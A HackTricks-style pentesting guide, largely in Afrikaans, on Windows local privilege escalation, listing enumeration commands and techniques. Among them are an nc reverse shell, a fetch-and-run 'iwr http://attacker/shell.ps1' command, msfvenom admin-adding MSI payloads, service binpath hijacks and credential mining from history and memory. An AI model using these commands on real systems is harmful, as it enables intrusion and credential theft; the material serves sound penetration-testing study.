# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Beste hulpmiddel om na Windows local privilege escalation vectors te soek:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Aanvanklike Windows-teorie

### Access Tokens

**As jy nie weet wat Windows Access Tokens is nie, lees eers die volgende bladsy voor jy voortgaan:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Kyk na die volgende bladsy vir meer inligting oor ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**As jy nie weet wat integrity levels in Windows is nie, moet jy eers die volgende bladsy lees voor jy voortgaan:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Daar is verskillende dinge in Windows wat jou kan **verhoed om die stelsel te enumereer**, uitvoerbare lêers te laat loop of selfs **jou aktiwiteite op te spoor**. Jy moet **lees** die volgende **bladsy** en al hierdie **verdedigingsmeganismes** **enumereer** voordat jy met die privilege escalation-enumeration begin:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess-prosesse wat deur `RAiLaunchAdminProcess` begin word, kan misbruik word om High IL te bereik sonder prompts wanneer AppInfo secure-path checks omseil word. Kyk na die toegewyde UIAccess/Admin Protection bypass workflow hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation kan misbruik word vir 'n arbitrêre SYSTEM registry write (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Onlangse Windows builds het ook 'n **SMB arbitrary-port** LPE path ingestel waar 'n bevoorregte plaaslike NTLM authentication oor 'n hergebruikte SMB TCP-connection weerspieël word:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Kyk of die Windows weergawe enige bekende vulnerability het (kyk ook na die patches wat toegepas is).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handig vir die soek van gedetailleerde inligting oor Microsoft sekuriteitskwesbaarhede. Hierdie databasis het meer as 4,700 sekuriteitskwesbaarhede, wat die **massive attack surface** toon wat ’n Windows-omgewing bied.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Enige credential/Juicy info gestoor in die env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geskiedenis
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

Jy kan leer hoe om dit aan te skakel in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Besonderhede van PowerShell-pyplyn-uitvoerings word aangeteken, insluitend uitgevoerde opdragte, opdrag-aanroepe, en dele van skrifte. Volledige uitvoeringsbesonderhede en uitvoerresultate mag egter nie vasgelê word nie.

Om dit moontlik te maak, volg die instruksies in die "Transcript files" afdeling van die dokumentasie, en kies **"Module Logging"** in plaas van **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Om die laaste 15 gebeurtenisse van PowerShell logs te sien, kan jy uitvoer:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

'n Volledige aktiwiteit- en volle-inhoudrekord van die script se uitvoering word vasgelê, wat verseker dat elke blok kode gedokumenteer word soos dit loop. Hierdie proses behou 'n omvattende ouditspoor van elke aktiwiteit, waardevol vir forensiese ondersoek en die ontleding van kwaadwillige gedrag. Deur alle aktiwiteit op die tyd van uitvoering te dokumenteer, word gedetailleerde insigte in die proses verskaf.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Logging events vir die Script Block kan gevind word binne die Windows Event Viewer by die pad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Om die laaste 20 events te sien, kan jy gebruik:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet-instellings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Lêerskuiwers
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Jy kan die stelsel kompromitteer as die opdaterings nie versoek word met http**S** nie, maar met http.

Jy begin deur te kyk of die netwerk 'n nie-SSL WSUS-opdatering gebruik deur die volgende in cmd uit te voer:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Of die volgende in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
As jy ’n antwoord kry soos een van hierdie:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
En as `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` of `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gelyk is aan `1`.

Dan, **is dit uitbuitbaar.** As die laaste registry gelyk is aan 0, dan sal die WSUS-inskrywing geïgnoreer word.

Om hierdie vulnerabilities uit te buit, kan jy tools soos gebruik: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Dit is MiTM gewapende exploit-skripte om 'fake' updates in nie-SSL WSUS traffic in te spuit.

Lees die research hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lees die volledige report hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basies is dit die flaw wat hierdie bug uitbuit:

> As ons die mag het om ons local user proxy te modify, en Windows Updates die proxy gebruik wat in Internet Explorer se settings gekonfigureer is, het ons dus die mag om [PyWSUS](https://github.com/GoSecure/pywsus) plaaslik te run om ons eie traffic te intercept en code as 'n elevated user op ons asset te run.
>
> Verder, aangesien die WSUS service die current user's settings gebruik, sal dit ook sy certificate store gebruik. As ons 'n self-signed certificate vir die WSUS hostname genereer en hierdie certificate in die current user's certificate store byvoeg, sal ons beide HTTP en HTTPS WSUS traffic kan intercept. WSUS gebruik geen HSTS-agtige mechanisms om trust-on-first-use tipe validation op die certificate te implementeer nie. As die certificate wat aangebied word deur die user trusted is en die korrekte hostname het, sal dit deur die service aanvaar word.

Jy kan hierdie vulnerability uitbuit deur die tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) te gebruik (sodra dit bevry is).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Baie enterprise agents stel 'n localhost IPC surface en 'n privileged update channel bloot. As enrollment na 'n attacker server gedwing kan word en die updater 'n rogue root CA of swak signer checks vertrou, kan 'n local user 'n malicious MSI lewer wat die SYSTEM service installeer. Sien 'n veralgemeende technique (gebaseer op die Netskope stAgentSvc chain – CVE-2025-0309) hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` stel 'n localhost service op **TCP/9401** bloot wat attacker-controlled messages verwerk, wat arbitrêre commands as **NT AUTHORITY\SYSTEM** toelaat.

- **Recon**: bevestig die listener en version, bv. `netstat -ano | findstr 9401` en `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: plaas 'n PoC soos `VeeamHax.exe` met die vereiste Veeam DLLs in dieselfde directory, en trigger dan 'n SYSTEM payload oor die local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Die diens voer die opdrag uit as SYSTEM.
## KrbRelayUp

’n **local privilege escalation**-kwesbaarheid bestaan in Windows **domain**-omgewings onder spesifieke toestande. Hierdie toestande sluit omgewings in waar **LDAP signing is not enforced,** gebruikers self-regte het wat hulle toelaat om **Resource-Based Constrained Delegation (RBCD),** te konfigureer, en die vermoë vir gebruikers om rekenaars binne die domain te skep. Dit is belangrik om daarop te let dat hierdie **requirements** met **default settings** voldoen word.

Vind die **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Vir meer inligting oor die vloei van die aanval, kyk [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**As** hierdie 2 registers **enabled** is (waarde is **0x1**), kan gebruikers van enige privilege `*.msi`-lêers as NT AUTHORITY\\**SYSTEM** **install** (execute).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit-payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
As jy 'n meterpreter-session het, kan jy hierdie tegniek outomatiseer deur die module **`exploit/windows/local/always_install_elevated`** te gebruik

### PowerUP

Gebruik die `Write-UserAddMSI`-opdrag van power-up om binne die huidige gids 'n Windows MSI-binêre te skep om regte te eskaleer. Hierdie script skryf 'n vooraf-gekompileerde MSI-installeerder uit wat vir 'n user/group byvoeging vra (so jy sal GIU-toegang nodig hê):
```
Write-UserAddMSI
```
Gebruik net die geskepte binary om voorregte te verhoog.

### MSI Wrapper

Lees hierdie tutoriaal om te leer hoe om ’n MSI wrapper te skep met hierdie tools. Let daarop dat jy ’n "**.bat**" file kan wrap as jy **net** **command lines** wil **execute**


{{#ref}}
msi-wrapper.md
{{endref}}

### Skep MSI met WIX


{{#ref}}
create-msi-with-wix.md
{{endref}}

### Skep MSI met Visual Studio

- **Generate** met Cobalt Strike of Metasploit ’n **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Open **Visual Studio**, kies **Create a new project** en tik "installer" in die search box. Kies die **Setup Wizard** project en klik **Next**.
- Gee die project ’n naam, soos **AlwaysPrivesc**, gebruik **`C:\privesc`** vir die location, kies **place solution and project in the same directory**, en klik **Create**.
- Hou aan om **Next** te klik totdat jy by stap 3 van 4 kom (choose files to include). Klik **Add** en kies die Beacon payload wat jy pas gegenereer het. Klik dan **Finish**.
- Merk die **AlwaysPrivesc** project in die **Solution Explorer** en in die **Properties**, verander **TargetPlatform** van **x86** na **x64**.
- Daar is ander properties wat jy kan verander, soos die **Author** en **Manufacturer** wat kan maak dat die installed app meer legitiem lyk.
- Regsklik op die project en kies **View > Custom Actions**.
- Regsklik **Install** en kies **Add Custom Action**.
- Dubbelklik op **Application Folder**, kies jou **beacon.exe** file en klik **OK**. Dit sal verseker dat die beacon payload uitgevoer word sodra die installer run.
- Onder die **Custom Action Properties**, verander **Run64Bit** na **True**.
- Laastens, **build it**.
- As die warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` gewys word, maak seker jy stel die platform na x64.

### MSI Installation

Om die **installation** van die malicious `.msi` file in **background:** uit te voer:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Om hierdie kwesbaarheid te ontgin kan jy gebruik: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Hierdie settings bepaal wat **gelog** word, so jy moet oplet
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, is interessant om te weet waarheen die logs gestuur word
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** is ontwerp vir die **bestuur van plaaslike Administrator wagwoorde**, en verseker dat elke wagwoord **uniek, ewekansig, en gereeld opgedateer** is op rekenaars wat by 'n domain aangesluit is. Hierdie wagwoorde word veilig gestoor binne Active Directory en kan slegs verkry word deur gebruikers aan wie voldoende permissions deur ACLs verleen is, wat hulle toelaat om plaaslike admin wagwoorde te sien indien gemagtig.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Indien aktief, word **plain-text wagwoorde in LSASS** (Local Security Authority Subsystem Service) gestoor.\
[**Meer info oor WDigest op hierdie bladsy**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Vanaf **Windows 8.1** het Microsoft verbeterde beskerming vir die Local Security Authority (LSA) ingestel om pogings van onbetroubare prosesse te **blokkeer** om **sy geheue te lees** of kode in te spuit, wat die stelsel verder beveilig.\
[**Meer inligting oor LSA Protection hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** is in **Windows 10** bekendgestel. Die doel daarvan is om die credentials wat op ’n toestel gestoor is, te beskerm teen threats soos pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Gekaste Credentials

**Domein credentials** word geverifieer deur die **Local Security Authority** (LSA) en deur bedryfstelsel-komponente gebruik. Wanneer ’n gebruiker se logon-data deur ’n geregistreerde security package geverifieer word, word domein credentials vir die gebruiker tipies ingestel.\
[**Meer inligting oor Cached Credentials hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Gebruikers & Groepe

### Lys Gebruikers & Groepe

Jy moet kyk of enige van die groepe waaraan jy behoort, interessante permissions het.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Bevoorregte groepe

As jy **aan ’n paar bevoorregte groepe behoort, kan jy dalk bevoorregtings eskaleer**. Leer hier oor bevoorregte groepe en hoe om hulle te misbruik om bevoorregtings te eskaleer:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-manipulasie

**Leer meer** oor wat ’n **token** is op hierdie bladsy: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Kyk na die volgende bladsy om **oor interessante tokens te leer** en hoe om hulle te misbruik:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Aangemelde gebruikers / Sessies
```bash
qwinsta
klist sessions
```
### Tuisgidse
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Wagwoordbeleid
```bash
net accounts
```
### Kry die inhoud van die clipboard
```bash
powershell -command "Get-Clipboard"
```
## Lopende prosesse

### Lêer- en gidsregte

Eerstens, wanneer jy die prosesse lys, **kontroleer vir wagwoorde binne die opdragreël van die proses**.\
Kyk of jy **een of ander lopende binêre kan oorskryf** of of jy skryftoestemmings het vir die binêre gids om moontlike [**DLL Hijacking attacks**](dll-hijacking/index.html) uit te buit:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Kontroleer altyd vir moontlike [**electron/cef/chromium debuggers** wat loop, jy kan dit misbruik om privileges te eskaleer](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kontroleer permissions van die proses se binaries**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kontroleer die toestemmings van die vouers van die prosesse se binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Jy kan 'n memory dump van 'n lopende proses skep met **procdump** van sysinternals. Dienste soos FTP het die **credentials in clear text in memory**, probeer om die memory te dump en die credentials te lees.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Onveilige GUI-programme

**Toepassings wat as SYSTEM loop, kan 'n gebruiker toelaat om 'n CMD te open, of deur vouers te blaai.**

Voorbeeld: "Windows Help and Support" (Windows + F1), soek vir "command prompt", klik op "Click to open Command Prompt"

## Dienste

Service Triggers laat Windows toe om 'n diens te begin wanneer sekere toestande voorkom (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, ens.). Selfs sonder SERVICE_START rights kan jy dikwels geprivilegieerde dienste begin deur hul triggers te aktiveer. Sien enumerasie- en aktiveringstegnieke hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

Kry 'n lys van dienste:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Toestemmings

Jy kan **sc** gebruik om inligting van 'n diens te kry
```bash
sc qc <service_name>
```
Dit word aanbeveel om die binary **accesschk** van _Sysinternals_ te hê om die vereiste privilegievlak vir elke diens te kontroleer.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Dit word aanbeveel om te kyk of "Authenticated Users" enige diens kan wysig:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Enable service

As jy hierdie fout kry (byvoorbeeld met SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Jy kan dit aktiveer deur te gebruik
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Neem in ag dat die diens upnphost afhanklik is van SSDPSRV om te werk (vir XP SP1)**

**Nog 'n workaround** vir hierdie probleem is om die volgende te run:
```
sc.exe config usosvc start= auto
```
### **Verander service binary path**

In die scenario waar die "Authenticated users" groep **SERVICE_ALL_ACCESS** op ’n service besit, is dit moontlik om die service se executable binary te wysig. Om **sc** te wysig en uit te voer:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Herbegin service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Priviligies kan deur verskeie toestemmings verhoog word:

- **SERVICE_CHANGE_CONFIG**: Laat herkonfigurasie van die service-binary toe.
- **WRITE_DAC**: Maak herkonfigurasie van toestemmings moontlik, wat lei tot die vermoë om service-konfigurasies te verander.
- **WRITE_OWNER**: Laat eienaarskap verkryging en herkonfigurasie van toestemmings toe.
- **GENERIC_WRITE**: Erf die vermoë om service-konfigurasies te verander.
- **GENERIC_ALL**: Erf ook die vermoë om service-konfigurasies te verander.

Vir die opsporing en uitbuiting van hierdie kwesbaarheid, kan die _exploit/windows/local/service_permissions_ gebruik word.

### Services binaries weak permissions

**Kyk of jy die binary kan wysig wat deur 'n service uitgevoer word** of of jy **write permissions op die folder** het waar die binary geleë is ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Jy kan elke binary wat deur 'n service uitgevoer word met **wmic** kry (nie in system32 nie) en jou toestemmings met **icacls** nagaan:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Jy kan ook **sc** en **icacls** gebruik:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Dienste register wysig regte

Jy moet kyk of jy enige diensregister kan wysig.\
Jy kan jou **regte** oor 'n diens **register** **kontroleer** deur:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Dit moet nagegaan word of **Authenticated Users** of **NT AUTHORITY\INTERACTIVE** `FullControl`-toestemmings het. Indien wel, kan die binêre wat deur die diens uitgevoer word, gewysig word.

Om die Path van die uitgevoerde binêre te verander:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Sommige Windows Accessibility-kenmerke skep per-gebruiker **ATConfig**-sleutels wat later deur ’n **SYSTEM**-proses in ’n HKLM-sessiesleutel gekopieer word. ’n Registry **symbolic link race** kan daardie geprivilegeerde skryfbewerking herlei na **enige HKLM-pad**, wat ’n arbitrêre HKLM **value write**-primitive gee.

Sleutelliggings (voorbeeld: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lys geïnstalleerde accessibility features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stoor gebruikerbeheerbare konfigurasie.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` word tydens logon/secure-desktop-oorgange geskep en is deur die gebruiker skryfbaar.

Misbruikvloei (CVE-2026-24291 / ATConfig):

1. Vul die **HKCU ATConfig**-waarde wat jy wil hê deur SYSTEM geskryf moet word.
2. Trigger die secure-desktop copy (bv. **LockWorkstation**), wat die AT broker flow begin.
3. **Wen die race** deur ’n **oplock** op `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` te plaas; wanneer die oplock afgaan, vervang die **HKLM Session ATConfig**-sleutel met ’n **registry link** na ’n beskermde HKLM-teiken.
4. SYSTEM skryf die aanvaller-geselekteerde waarde na die hergerigte HKLM-pad.

Sodra jy arbitrêre HKLM value write het, pivot na LPE deur service configuration values te oorskryf:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Kies ’n service wat ’n normale gebruiker kan start (bv. **`msiserver`**) en trigger dit ná die skryf. **Nota:** die publieke exploit-implementering **lock the workstation** as deel van die race.

Voorbeeld tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

As jy hierdie toestemming oor ’n registry het, beteken dit **jy kan subregistries vanaf hierdie een skep**. In die geval van Windows-dienste is dit **genoeg om arbitrêre code uit te voer:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

As die pad na ’n executable nie tussen aanhalingstekens is nie, sal Windows probeer om elke einde voor ’n spasie uit te voer.

Byvoorbeeld, vir die pad _C:\Program Files\Some Folder\Service.exe_ sal Windows probeer om die volgende uit te voer:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Lys alle unquoted service paths, uitgesluit dié wat aan ingeboude Windows services behoort:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
